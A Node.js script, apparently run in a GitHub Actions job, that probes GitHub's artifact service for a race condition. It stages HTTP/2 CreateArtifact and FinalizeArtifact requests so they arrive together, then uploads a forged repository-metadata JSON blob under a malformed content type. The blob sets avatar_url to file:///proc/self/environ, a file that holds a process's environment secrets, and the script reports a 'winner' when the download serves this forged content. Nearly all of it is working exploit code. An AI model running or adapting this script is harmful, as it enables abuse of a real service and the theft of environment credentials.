'use strict';

// Small same-name lifecycle probe.  It tests duplicate creation after a
// successful finalize and creation released while that finalize is in flight.

const crypto = require('node:crypto');
const fs = require('node:fs');
const http2 = require('node:http2');
const https = require('node:https');

const SERVICE = 'github.actions.results.api.v1.ArtifactService';
const ODD_TYPE = '\x85application/json';
const ODD_HEX = Buffer.from(ODD_TYPE, 'latin1').toString('hex');

function fail(message) { throw new Error(message); }
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

function backendIds(token) {
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
  const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
  const fields = scope?.split(':') || [];
  if (fields.length !== 3) fail('Actions.Results scope unavailable');
  return {run: fields[1], job: fields[2]};
}

function request(url, {method = 'GET', headers = {}, body = null} = {}) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, {method, headers}, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(Buffer.from(chunk)));
      response.on('end', () => resolve({status: response.statusCode || 0, headers: response.headers, body: Buffer.concat(chunks)}));
    });
    req.setTimeout(25000, () => req.destroy(new Error('HTTP timeout')));
    req.on('error', reject);
    req.end(body);
  });
}

async function twirp(method, token, value) {
  const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const body = Buffer.from(JSON.stringify(value));
  const response = await request(`${origin}/twirp/${SERVICE}/${method}`, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      accept: 'application/json',
      'content-type': 'application/json',
      'content-length': String(body.length),
    },
    body,
  });
  let parsed = {};
  try { parsed = JSON.parse(response.body.toString()); } catch {}
  return {response, parsed};
}

async function create(token, ids, name, spec) {
  return twirp('CreateArtifact', token, {
    workflow_run_backend_id: ids.run,
    workflow_job_run_backend_id: ids.job,
    name,
    version: spec.version,
    mime_type: spec.mime,
  });
}

async function finalize(token, ids, name) {
  return twirp('FinalizeArtifact', token, {
    workflow_run_backend_id: ids.run,
    workflow_job_run_backend_id: ids.job,
    name,
    size: '2',
  });
}

function createSummary(result) {
  return {
    status: result.response.status,
    ok: Boolean(result.parsed.ok),
    error: result.response.status >= 400 ? String(result.parsed.msg || result.response.body.toString()).slice(0, 180) : '',
  };
}

function finalizeSummary(result) {
  return {
    status: result.response.status,
    ok: Boolean(result.parsed.ok),
    artifactId: String(result.parsed.artifact_id || result.parsed.artifactId || ''),
    error: result.response.status >= 400 ? String(result.parsed.msg || result.response.body.toString()).slice(0, 180) : '',
  };
}

function uploadUrl(result) {
  return result.parsed.signed_upload_url || result.parsed.signedUploadUrl || '';
}

async function putBlob(url, body) {
  const response = await request(url, {
    method: 'PUT',
    headers: {
      'content-type': 'application/octet-stream',
      'content-length': String(body.length),
      'x-ms-blob-type': 'BlockBlob',
      'x-ms-blob-content-type': ODD_TYPE,
    },
    body,
  });
  if (response.status < 200 || response.status >= 300) fail(`blob PUT HTTP ${response.status}`);
}

function connectH2(origin) {
  return new Promise((resolve, reject) => {
    const client = http2.connect(origin);
    const timer = setTimeout(() => reject(new Error('H2 connect timeout')), 20000);
    client.once('connect', () => { clearTimeout(timer); resolve(client); });
    client.once('error', reject);
  });
}

function stageH2(client, path, token, body) {
  const stream = client.request({
    ':method': 'POST',
    ':path': path,
    authorization: `Bearer ${token}`,
    accept: 'application/json',
    'content-type': 'application/json',
    'content-length': String(body.length),
  }, {endStream: false});
  let responseHeaders = {};
  const chunks = [];
  const result = new Promise((resolve, reject) => {
    const timer = setTimeout(() => { stream.close(http2.constants.NGHTTP2_CANCEL); reject(new Error('H2 response timeout')); }, 30000);
    stream.on('response', headers => { responseHeaders = headers; });
    stream.on('data', chunk => chunks.push(Buffer.from(chunk)));
    stream.on('end', () => {
      clearTimeout(timer);
      const response = {status: Number(responseHeaders[':status'] || 0), headers: responseHeaders, body: Buffer.concat(chunks)};
      let parsed = {};
      try { parsed = JSON.parse(response.body.toString()); } catch {}
      resolve({response, parsed});
    });
    stream.on('error', error => { clearTimeout(timer); reject(error); });
  });
  return new Promise((resolve, reject) => {
    stream.write(body.subarray(0, -1), error => {
      if (error) reject(error);
      else resolve({release: () => stream.end(body.subarray(-1)), result});
    });
  });
}

function carrier(repositoryPath) {
  return Buffer.from(JSON.stringify({
    full_name: repositoryPath,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette lifecycle carrier',
    stargazers_count: 0,
  }));
}

function contentTypeHex(response) {
  const type = Array.isArray(response.headers['content-type'])
    ? response.headers['content-type'][0] : response.headers['content-type'] || '';
  return Buffer.from(type, 'latin1').toString('hex');
}

async function verify(repository, artifactId, urls, token) {
  const repositoryPath = `${repository}/actions/artifacts/${artifactId}/zip`;
  const body = carrier(repositoryPath);
  await Promise.all(urls.map(url => putBlob(url, body)));
  const first = await request(`https://api.github.com/repos/${repositoryPath}`, {
    headers: {
      accept: 'application/vnd.github.v3+json',
      authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
      'user-agent': 'repo-cassette-lifecycle-probe',
      'x-github-api-version': '2022-11-28',
    },
  });
  const final = first.status >= 300 && first.status < 400 && first.headers.location
    ? await request(first.headers.location, {headers: {'user-agent': 'repo-cassette-lifecycle-probe'}})
    : first;
  const result = {
    artifactId,
    repositoryPath,
    status: final.status,
    contentTypeHex: contentTypeHex(final),
    bodyMatch: final.body.equals(body),
  };
  result.winner = result.status === 200 && result.contentTypeHex === ODD_HEX && result.bodyMatch;
  return result;
}

function output(name, value) {
  if (process.env.GITHUB_OUTPUT) fs.appendFileSync(process.env.GITHUB_OUTPUT, `${name}=${value}\n`);
}

async function checkIds(label, idsToCheck, urls, repository, token) {
  const checks = [];
  for (const artifactId of [...new Set(idsToCheck.filter(x => /^\d+$/.test(x)))]) {
    const check = await verify(repository, artifactId, urls, token);
    checks.push(check);
    if (check.winner) {
      console.log(`LIFECYCLE_WINNER ${JSON.stringify({label, ...check})}`);
      output('winner_artifact_id', artifactId);
      output('winner_repository', check.repositoryPath);
      return {checks, winner: check};
    }
  }
  return {checks};
}

async function sequential(token, ids, repository, name, firstSpec, secondSpec, label) {
  const placeholder = Buffer.from('{}');
  const first = await create(token, ids, name, firstSpec);
  const firstUrl = uploadUrl(first);
  if (!firstUrl) return {label, first: createSummary(first)};
  await putBlob(firstUrl, placeholder);
  const finalOne = await finalize(token, ids, name);
  const second = await create(token, ids, name, secondSpec);
  const secondUrl = uploadUrl(second);
  if (secondUrl) await putBlob(secondUrl, placeholder);
  const idsToCheck = [finalizeSummary(finalOne).artifactId];
  let finalTwo = null;
  if (secondUrl) {
    finalTwo = await finalize(token, ids, name);
    idsToCheck.push(finalizeSummary(finalTwo).artifactId);
  }
  const verified = await checkIds(label, idsToCheck, [firstUrl, secondUrl].filter(Boolean), repository, token);
  return {
    label,
    first: createSummary(first),
    finalizeOne: finalizeSummary(finalOne),
    second: createSummary(second),
    finalizeTwo: finalTwo ? finalizeSummary(finalTwo) : null,
    checks: verified.checks,
    winner: verified.winner,
  };
}

async function overlap(token, ids, repository, name, firstSpec, secondSpec, delay, label) {
  const placeholder = Buffer.from('{}');
  const first = await create(token, ids, name, firstSpec);
  const firstUrl = uploadUrl(first);
  if (!firstUrl) return {label, first: createSummary(first)};
  await putBlob(firstUrl, placeholder);
  const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const client = await connectH2(origin);
  try {
    const finalizeBody = Buffer.from(JSON.stringify({
      workflow_run_backend_id: ids.run,
      workflow_job_run_backend_id: ids.job,
      name,
      size: String(placeholder.length),
    }));
    const secondBody = Buffer.from(JSON.stringify({
      workflow_run_backend_id: ids.run,
      workflow_job_run_backend_id: ids.job,
      name,
      version: secondSpec.version,
      mime_type: secondSpec.mime,
    }));
    const [stagedFinalize, stagedCreate] = await Promise.all([
      stageH2(client, `/twirp/${SERVICE}/FinalizeArtifact`, token, finalizeBody),
      stageH2(client, `/twirp/${SERVICE}/CreateArtifact`, token, secondBody),
    ]);
    stagedFinalize.release();
    if (delay) await sleep(delay);
    stagedCreate.release();
    const secondPromise = stagedCreate.result.then(async result => {
      const url = uploadUrl(result);
      if (url) await putBlob(url, placeholder);
      return result;
    });
    const [finalOne, second] = await Promise.all([stagedFinalize.result, secondPromise]);
    const secondUrl = uploadUrl(second);
    const finalTwo = secondUrl ? await finalize(token, ids, name) : null;
    const idsToCheck = [finalizeSummary(finalOne).artifactId];
    if (finalTwo) idsToCheck.push(finalizeSummary(finalTwo).artifactId);
    const verified = await checkIds(label, idsToCheck, [firstUrl, secondUrl].filter(Boolean), repository, token);
    return {
      label,
      delayMs: delay,
      first: createSummary(first),
      finalizeOne: finalizeSummary(finalOne),
      second: createSummary(second),
      finalizeTwo: finalTwo ? finalizeSummary(finalTwo) : null,
      checks: verified.checks,
      winner: verified.winner,
    };
  } finally {
    client.close();
  }
}

async function main() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const repository = process.env.GITHUB_REPOSITORY;
  if (!token || !process.env.GITHUB_TOKEN || !repository) fail('Actions environment incomplete');
  const ids = backendIds(token);
  const specs = {
    v6: {version: 6, mime: ODD_TYPE},
    v7: {version: 7, mime: 'application/json'},
  };
  const nonce = `${process.env.GITHUB_RUN_ID}-${crypto.randomBytes(4).toString('hex')}`;
  const cases = [
    {kind: 'sequential', first: 'v7', second: 'v6'},
    {kind: 'sequential', first: 'v6', second: 'v7'},
    ...[0, 1, 4].flatMap(delay => [
      {kind: 'overlap', first: 'v7', second: 'v6', delay},
      {kind: 'overlap', first: 'v6', second: 'v7', delay},
    ]),
  ];
  for (const [index, item] of cases.entries()) {
    const label = `${item.kind}-${item.first}-then-${item.second}${item.delay === undefined ? '' : `-d${item.delay}`}`;
    const name = `repo-cassette-lifecycle-${nonce}-${index}`;
    const row = item.kind === 'sequential'
      ? await sequential(token, ids, repository, name, specs[item.first], specs[item.second], label)
      : await overlap(token, ids, repository, name, specs[item.first], specs[item.second], item.delay, label);
    console.log(`LIFECYCLE_RESULT ${JSON.stringify(row)}`);
    if (row.winner) return;
  }
}

main().catch(error => {
  console.error(error.stack || error);
  process.exitCode = 1;
});
